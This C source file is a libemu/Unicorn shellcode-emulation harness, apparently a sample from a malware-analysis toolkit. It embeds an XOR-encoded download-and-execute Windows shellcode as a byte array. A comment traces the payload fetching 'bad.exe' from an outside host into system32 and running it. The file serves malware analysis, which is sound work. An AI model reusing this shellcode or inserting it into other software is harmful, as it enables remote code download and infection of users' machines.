
/*
   libemu / Unicorn compatibility shim layer 
   Sample contributed by FireEye FLARE team
   Author: David Zimmer <david.zimmer@fireeye.com> <dzzie@yahoo.com>
   License: GPL
*/

#include "lib.h"

/*
	loaded Unicorn emulator v1.0
	building new libemu win32 env...
	setting api hooks...
	Max Steps: 20000000
	Using base offset: 0x401000

	Starting shellcode

	4010e9  GetProcAddress(GetSystemDirectoryA)
	4010e9  GetProcAddress(WinExec)
	4010e9  GetProcAddress(ExitThread)
	4010e9  GetProcAddress(LoadLibraryA)
	401094  LoadLibraryA(urlmon)
	4010e9  GetProcAddress(URLDownloadToFileA)
	4010b8  GetSystemDirectoryA( c:\windows\system32\ )
	4010d1  URLDownloadToFileA(http://nepenthes.mwcollect.org/bad.exe, c:\WINDOWS\system32\a.exe)
	4010d8  WinExec(c:\WINDOWS\system32\a.exe)
	4010dc  ExitThread(32)

	emulation complete 1c96 steps last eip=4010dc
	Press any key to exit...
*/

unsigned char shellcode[378] = {
	0xEB, 0x10, 0x5A, 0x4A, 0x33, 0xC9, 0x66, 0xB9, 0x3C, 0x01, 0x80, 0x34, 0x0A, 0x99, 0xE2, 0xFA, 
	0xEB, 0x05, 0xE8, 0xEB, 0xFF, 0xFF, 0xFF, 0x70, 0x4C, 0x99, 0x99, 0x99, 0xC3, 0xFD, 0x38, 0xA9, 
	0x99, 0x99, 0x99, 0x12, 0xD9, 0x95, 0x12, 0xE9, 0x85, 0x34, 0x12, 0xD9, 0x91, 0x12, 0x41, 0x12, 
	0xEA, 0xA5, 0x12, 0xED, 0x87, 0xE1, 0x9A, 0x6A, 0x12, 0xE7, 0xB9, 0x9A, 0x62, 0x12, 0xD7, 0x8D, 
	0xAA, 0x74, 0xCF, 0xCE, 0xC8, 0x12, 0xA6, 0x9A, 0x62, 0x12, 0x6B, 0xF3, 0x97, 0xC0, 0x6A, 0x3F, 
	0xED, 0x91, 0xC0, 0xC6, 0x1A, 0x5E, 0x9D, 0xDC, 0x7B, 0x70, 0xC0, 0xC6, 0xC7, 0x12, 0x54, 0x12, 
	0xDF, 0xBD, 0x9A, 0x5A, 0x48, 0x78, 0x9A, 0x58, 0xAA, 0x50, 0xFF, 0x12, 0x91, 0x12, 0xDF, 0x85, 
	0x9A, 0x5A, 0x58, 0x78, 0x9B, 0x9A, 0x58, 0x12, 0x99, 0x9A, 0x5A, 0x12, 0x63, 0x12, 0x6E, 0x1A, 
	0x5F, 0x97, 0x12, 0x49, 0xF3, 0x9D, 0xC0, 0x71, 0xC9, 0x99, 0x99, 0x99, 0x1A, 0x5F, 0x94, 0xCB, 
	0xCF, 0x66, 0xCE, 0x65, 0xC3, 0x12, 0x41, 0xF3, 0x98, 0xC0, 0x71, 0xA4, 0x99, 0x99, 0x99, 0x1A, 
	0x5F, 0x8A, 0xCF, 0xDF, 0x19, 0xA7, 0x19, 0xEC, 0x63, 0x19, 0xAF, 0x19, 0xC7, 0x1A, 0x75, 0xB9, 
	0x12, 0x45, 0xF3, 0xB9, 0xCA, 0x66, 0xCE, 0x75, 0x5E, 0x9D, 0x9A, 0xC5, 0xF8, 0xB7, 0xFC, 0x5E, 
	0xDD, 0x9A, 0x9D, 0xE1, 0xFC, 0x99, 0x99, 0xAA, 0x59, 0xC9, 0xC9, 0xCA, 0xCF, 0xC9, 0x66, 0xCE, 
	0x65, 0x12, 0x45, 0xC9, 0xCA, 0x66, 0xCE, 0x69, 0xC9, 0x66, 0xCE, 0x6D, 0xAA, 0x59, 0x35, 0x1C, 
	0x59, 0xEC, 0x60, 0xC8, 0xCB, 0xCF, 0xCA, 0x66, 0x4B, 0xC3, 0xC0, 0x32, 0x7B, 0x77, 0xAA, 0x59, 
	0x5A, 0x71, 0xBF, 0x66, 0x66, 0x66, 0xDE, 0xFC, 0xED, 0xC9, 0xEB, 0xF6, 0xFA, 0xD8, 0xFD, 0xFD, 
	0xEB, 0xFC, 0xEA, 0xEA, 0x99, 0xDE, 0xFC, 0xED, 0xCA, 0xE0, 0xEA, 0xED, 0xFC, 0xF4, 0xDD, 0xF0, 
	0xEB, 0xFC, 0xFA, 0xED, 0xF6, 0xEB, 0xE0, 0xD8, 0x99, 0xCE, 0xF0, 0xF7, 0xDC, 0xE1, 0xFC, 0xFA, 
	0x99, 0xDC, 0xE1, 0xF0, 0xED, 0xCD, 0xF1, 0xEB, 0xFC, 0xF8, 0xFD, 0x99, 0xD5, 0xF6, 0xF8, 0xFD, 
	0xD5, 0xF0, 0xFB, 0xEB, 0xF8, 0xEB, 0xE0, 0xD8, 0x99, 0xEC, 0xEB, 0xF5, 0xF4, 0xF6, 0xF7, 0x99, 
	0xCC, 0xCB, 0xD5, 0xDD, 0xF6, 0xEE, 0xF7, 0xF5, 0xF6, 0xF8, 0xFD, 0xCD, 0xF6, 0xDF, 0xF0, 0xF5, 
	0xFC, 0xD8, 0x99, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x6E, 0x65, 0x70, 0x65, 0x6E, 0x74, 
	0x68, 0x65, 0x73, 0x2E, 0x6D, 0x77, 0x63, 0x6F, 0x6C, 0x6C, 0x65, 0x63, 0x74, 0x2E, 0x6F, 0x72, 
	0x67, 0x2F, 0x62, 0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x80
};

//the hooks we used are from scdbg which took the shortcut of using some globals
//since there is only one engine instance per run...
emu_env_w32* env = 0;
uc_engine *uc = 0;
uc_engine *mem = 0; 
emu_cpu *cpu;

run_time_options opts;

int HookDetector(char* fxName){

	/*  typical api prolog 0-5, security apps will replace this with jmp xxxxxxxx
		which the hookers will detect, or sometimes just jump over always without checking..
		the jump without checking screws us up, so were compensating with this callback...
		7C801D7B   8BFF             MOV EDI,EDI
		7C801D7D   55               PUSH EBP
		7C801D7E   8BEC             MOV EBP,ESP
	*/

	//todo: wire in antispam?
	printf("\tjmp %s+5 hook evasion code detected! trying to recover...\n", fxName);

	cpu->reg[esp] = cpu->reg[ebp];
	cpu->reg[ebp] = popd();
	return 1;
}

void set_hooks(struct emu_env_w32 *env){

	#define ADDHOOK(name) \
		extern int32_t	__stdcall hook_##name(struct emu_env_w32 *win, struct emu_env_w32_dll_export *ex);\
		if(emu_env_w32_export_new_hook(env, #name, hook_##name, NULL) < 0) printf("Failed to setHook %s\n",#name);

	#define HOOKBOTH(name) \
		extern int32_t	__stdcall hook_##name(struct emu_env_w32 *win, struct emu_env_w32_dll_export *ex);\
		if(emu_env_w32_export_new_hook(env, #name"A", hook_##name, NULL) < 0) printf("Failed to setHook %s\n",#name"A");\
		if(emu_env_w32_export_new_hook(env, #name"W", hook_##name, NULL) < 0) printf("Failed to setHook %s\n",#name"W");

	//following support both Ascii and Wide api
	HOOKBOTH(LoadLibrary);
    HOOKBOTH(URLDownloadToFile);

	//these are up here because this declares the extern so we can break macro pattern in manual hooking below..
	ADDHOOK(ExitProcess);

	//these dont follow the macro pattern..mostly redirects/multitasks
	emu_env_w32_export_new_hook(env, "LoadLibraryExA",  hook_LoadLibrary, NULL);
	emu_env_w32_export_new_hook(env, "ExitThread", hook_ExitProcess, NULL);

	ADDHOOK(WinExec);
	ADDHOOK(GetProcAddress);
	ADDHOOK(GetSystemDirectoryA);

}

 


static void hook_code(uc_engine *uc, uint64_t address, uint32_t size, void *user_data)
{
    int r_eip;

    uc_reg_read(uc, UC_X86_REG_EIP, &r_eip);

    if(opts.steps == 0){
        uc_emu_stop(uc);
        return;
    }

    if(opts.steps != -1 && opts.cur_step > opts.steps){
        printf("reached max step count stopping\n");
        uc_emu_stop(uc);
        return;
    }

	struct emu_env_w32_dll_export *ex = NULL;
	ex = emu_env_w32_eip_check(env); //will execute the api hook if one is set..

	if ( ex != NULL) 
	{				
		if ( ex->fnhook == NULL )
		{
			if( strlen(ex->fnname) == 0)
				printf("%x\tunhooked call to ordinal %s.0x%x\tstep=%d\n", previous_eip , dllFromAddress(r_eip), ex->ordinal, opts.cur_step );
			else
				printf("%x\tunhooked call to %s.%s\tstep=%d\n", previous_eip, dllFromAddress(r_eip), ex->fnname, opts.cur_step );
			uc_emu_stop(uc);
		}
	}else{
		previous_eip = r_eip;
	}

	opts.cur_step++;

}

// callback for tracing memory access (READ or WRITE)
static bool hook_mem_invalid(uc_engine *uc, uc_mem_type type, uint64_t address, int size, int64_t value, void *user_data)
{
	
	nl();

    switch(type) {
        default:
			  printf(">>> hook_mem_invalid %d at 0x%llX, data size = %u, data value = 0x%llX\n", type, address, size, value);
              break;
			  // return false to indicate we want to stop emulation
            
		case UC_MEM_READ_UNMAPPED:
			   printf(">>> Missing memory is being READ at 0x%llX, data size = %u, data value = 0x%llX\n", address, size, value);
			   break;

        case UC_MEM_WRITE_UNMAPPED:
               printf(">>> Missing memory is being WRITE at 0x%llX, data size = %u, data value = 0x%llX\n", address, size, value);
               break;             
				 // map this memory in with 2MB in size
                 //uc_mem_map(uc, 0xaaaa0000, 2 * 1024*1024, UC_PROT_ALL);
                 // return true to indicate we want to continue
    }

	return false;
}





static void run_sc(void)
{
    uc_err err;
    uc_hook trace1;

    uint32_t stack = 0x120000;
    uint32_t stack_sz = 0x10000;
    uc_mem_map(uc, stack, stack_sz, UC_PROT_ALL);
	emu_reg32_write(uc, esp, stack + stack_sz);
 
    if (emu_memory_write_block(uc, opts.baseAddress, opts.scode, opts.size)) {
        printf("Failed to write shellcode to memory\n");
        return;
    }
    
    // tracing all instructions by having @begin > @end
    uc_hook_add(uc, &trace1, UC_HOOK_CODE, hook_code, NULL, -1, 0);

    // intercept invalid memory events
    uc_hook_add(uc, &trace1, UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED, hook_mem_invalid, NULL, 1, 0);

    printf("\nStarting shellcode\n\n");

    err = uc_emu_start(uc, opts.baseAddress,  opts.baseAddress + opts.size, 0, 0);

    if(err) {
        printf("Error %u: %s\n", err, uc_strerror(err));
		dumpRegisters();
    }

	printf("\nemulation complete %x steps last eip=%x\n", opts.cur_step, emu_cpu_eip_get(uc));

}

int main(int argc, char **argv, char **envp)
{
	unsigned int vMaj, vMin;

	SetConsoleTitle("libemu/Unicorn compatibility shim layer - FireEye FLARE Team");  
    memset(&opts,0,sizeof(struct run_time_options));

	if (!uc_dyn_load(NULL, 0)) {
        printf("Error dynamically loading unicorn.dll Failed to find:%s\n", lastDynLoadErr);	
		return -1;
	} 
	
	uc_version(&vMaj,&vMin);
	printf("loaded Unicorn emulator v%d.%d\n", vMaj,vMin);
	printf("building new libemu win32 env...\n");
    env = emu_env_w32_new();

    if(env==NULL){
        printf("failed\n");
        return 0;
    }
    
    uc = env->uc;
    mem = uc;
    cpu = emu_cpu_get(uc);
	
	printf("setting api hooks...\n");
	set_hooks(env);
 
    opts.scode = shellcode;
	opts.size = sizeof(shellcode);
	opts.steps = 0x20000000;
	opts.baseAddress = 0x401000;
    
    emu_env_w32_set_hookDetect_monitor((uint32_t)HookDetector);
   
    printf("Max Steps: %x\n", opts.steps);
	printf("Using base offset: 0x%x\n", opts.baseAddress);

	run_sc();
    uc_close(env->uc);

    //if( IsDebuggerPresent() ) {
		printf("Press any key to exit...\n");	
		getch();
	//}

    return 0;
}
